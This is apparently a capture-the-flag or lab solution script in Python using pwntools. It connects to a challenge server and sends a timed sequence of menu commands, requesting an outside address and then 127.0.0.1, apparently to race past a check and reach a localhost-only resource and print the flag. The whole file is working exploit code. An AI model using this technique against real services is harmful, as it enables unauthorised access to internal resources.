
from pwn import *
import time


if __name__ == "__main__":
    r = remote( 'up.zoolab.org', 10932)
    payload = """g
140.113.203.211/10000
g
127.0.0.1/10000
v
"""
#     payload = """g
# google.com/10000
# g
# 127.0.0.1/10000
# v
# """
    r.sendline( payload.encode())
    # recved = r.recvuntil("?").decode()
    time.sleep(0.5)
    printer = """v
q
"""
    finisher = "}"
    r.sendline( printer.encode())
    recved = r.recvuntil( finisher.encode()).decode()
    # print( ">>>>>>>kek" + recved + "kek<<<<<<<")
    r.close()

    # print( "finding flag")
    print( recved[ recved.find("FLAG{"): ])

